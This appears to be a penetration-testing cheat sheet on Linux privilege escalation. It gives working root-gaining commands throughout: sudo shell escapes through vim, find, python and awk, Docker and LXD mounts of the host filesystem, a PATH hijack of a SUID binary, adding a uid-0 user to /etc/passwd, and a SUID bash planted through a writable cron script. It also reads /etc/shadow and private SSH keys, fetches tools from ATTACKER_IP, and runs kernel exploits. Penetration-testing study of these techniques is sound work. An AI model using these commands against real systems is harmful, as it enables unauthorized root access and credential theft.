# Linux Privilege Escalation


---

## Priority 1: Check sudo (FIRST THING TO DO!)

### The Most Common Privesc Path

```bash
# Check sudo permissions
sudo -l
```

**If you see NOPASSWD with ANY binary:**

1. Go to https://gtfobins.github.io/
2. Search for that binary
3. Follow the sudo section

### Common Exploitable sudo Binaries

**vim:**
```bash
sudo vim -c ':!/bin/sh'
```

**find:**
```bash
sudo find . -exec /bin/sh \; -quit
```

**python/python3:**
```bash
sudo python -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import os; os.system("/bin/sh")'
```

**less/more:**
```bash
sudo less /etc/hosts
# Then type: !/bin/sh
```

**awk:**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**perl:**
```bash
sudo perl -e 'exec "/bin/sh";'
```

**nmap (old versions):**
```bash
echo "os.execute('/bin/sh')" > shell.nse
sudo nmap --script=shell.nse
```

**nano:**
```bash
sudo nano
# Then: Ctrl+R, Ctrl+X
# Type: reset; sh 1>&0 2>&0
```

**env:**
```bash
sudo env /bin/sh
```
---

## Priority 2: Group Membership

### Check Your Groups

```bash
id
groups
```

### Docker Group Exploitation

```bash
# If you see "docker" in groups:
id | grep docker

# Exploit (instant root):
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# You're now root on the host!
cd /root
cat /etc/shadow
```

### LXD/LXC Group Exploitation

```bash
# If you see "lxd" in groups:
id | grep lxd

# Exploit:
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Navigate to host root
cd /mnt/root/root
```

### Disk Group

```bash
# If you see "disk" in groups:
id | grep disk

# Read entire disk
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

---

## Priority 3: SUID Binaries

### Find SUID Files

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Save to file for analysis
find / -perm -4000 -type f 2>/dev/null > suid_binaries.txt
```

### Identify Exploitable SUID

**Focus on non-standard binaries:**
- NOT in /bin or /usr/bin (usually safe)
- Custom application binaries
- Anything in /opt, /usr/local/bin, /home

**Analyze suspicious SUID binaries:**
```bash
# Check what it does
strings /path/to/suid/binary

# Check library calls
ltrace /path/to/suid/binary 2>&1

# Check system calls
strace /path/to/suid/binary 2>&1

# Look for:
# - system() calls
# - exec() calls
# - Relative paths (exploitable via PATH)
```

### Common SUID Exploits

**If binary calls system() without full path:**
```bash
# Example: /opt/backup calls "tar" without /bin/tar

# Create malicious binary
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar

# Modify PATH
export PATH=/tmp:$PATH

# Run SUID binary
/opt/backup

# Now root!
```

**Known vulnerable SUID binaries:**
- Check GTFOBins for: nmap, vim, find, cp, mv, etc.

---

## Priority 4: Capabilities

### Check for Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
```

### Exploitable Capabilities

**cap_setuid:**
```bash
# If python has cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**cap_dac_override:**
```bash
# Can read any file
# Read /etc/shadow, crack passwords
```

**cap_dac_read_search:**
```bash
# Can read any file
tar -czf /tmp/shadow.tar.gz /etc/shadow
# Extract and read
```

---

## Priority 5: Writable System Files

### Check Critical File Permissions

```bash
# Can you write to /etc/passwd?
ls -la /etc/passwd

# Can you write to /etc/shadow?
ls -la /etc/shadow

# Can you write to /etc/sudoers?
ls -la /etc/sudoers
```

### Exploit Writable /etc/passwd

```bash
# If /etc/passwd is writable:

# Generate password hash
openssl passwd -1 -salt evil password123
# Output: $1$evil$hash...

# Add new root user
echo 'evil:$1$evil$hash...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su evil
# Password: password123

# Now root!
```

---

## Priority 6: Cron Jobs

### Discover Cron Jobs

```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/

# User cron
crontab -l
crontab -l -u username 2>/dev/null

# Check all users' cron
for user in $(cut -f1 -d: /etc/passwd); do 
    echo "=== $user ===" 
    crontab -u $user -l 2>/dev/null
done
```

### Monitor Running Processes

```bash
# Download pspy
wget http://ATTACKER_IP/pspy64
chmod +x pspy64

# Run and watch
./pspy64

# Look for:
# - Root processes running scripts
# - Scripts you can modify
# - Wildcards in commands (tar *, chmod *, etc.)
```

### Exploit Writable Cron Script

```bash
# If root runs /opt/backup.sh and you can write to it:

# Check permissions
ls -la /opt/backup.sh

# If writable, add your payload
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh

# Wait for cron to run (check /etc/crontab for timing)

# Execute SUID bash
/tmp/rootbash -p
# Now root!
```
---

## Priority 7: Kernel Exploits

### LAST RESORT ONLY

**Why last resort:**
- Can crash the system
- Often unreliable
- Noisy in logs
- May cause kernel panic

**When to use:**
- No other privesc path found

### Check Kernel Version

```bash
uname -a
uname -r
cat /etc/issue
cat /etc/os-release
```

### Search for Kernel Exploits

```bash
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Common kernel exploits:
# DirtyCow (CVE-2016-5195) - Kernel 2.6.22 - 4.8.3
# DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11  
# PwnKit (CVE-2021-4034) - Any with pkexec
```

### Using Kernel Exploits

```bash
# Download exploit
searchsploit -m exploits/linux/local/xxxxx.c

# Read it!
cat xxxxx.c

# Compile on target (if gcc available)
gcc xxxxx.c -o exploit

# Or compile on Kali and transfer
gcc xxxxx.c -o exploit
# Transfer to target

# Execute
./exploit
```

---

## Automated Privilege Escalation Enumeration

### LinPEAS (Most Comprehensive)

```bash
# Download and run
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Review output focusing on RED/YELLOW findings
less -R linpeas_output.txt
```

**LinPEAS checks:**
- sudo permissions
- SUID binaries
- Capabilities
- Writable files
- Cron jobs
- Kernel version
- And 100+ other checks

**Use this to identify privesc vectors, then manually exploit**

---

## Privilege Escalation Workflow

### Systematic Approach 

**Quick Manual Checks**
```bash
sudo -l
id
find / -perm -4000 -type f 2>/dev/null | head -20
```

**Run LinPEAS**
```bash
./linpeas.sh | tee linpeas.txt
```

**Review LinPEAS Output**
```
Focus on RED/YELLOW sections:
- sudo permissions with NOPASSWD
- Interesting group memberships
- Unusual SUID binaries
- Writable /etc files
- Exploitable cron jobs
```

**Attempt Exploitation**
```
Try in priority order:
1. sudo with GTFOBins (if found)
2. Docker/LXD group (if member)
3. SUID binary exploitation
4. Capabilities abuse
5. Writable critical files
6. Cron job abuse
7. Kernel exploit (last resort)
```

**Documentation**
```
If successful:
- Screenshot root proof (whoami, id)
- Document complete attack chain
- Create CRITICAL/HIGH finding

If unsuccessful after a good amount of time:
- Document current access level
- Note what you tried
- Create finding for initial access method
- Move to different system
- Return later if time permits
```

---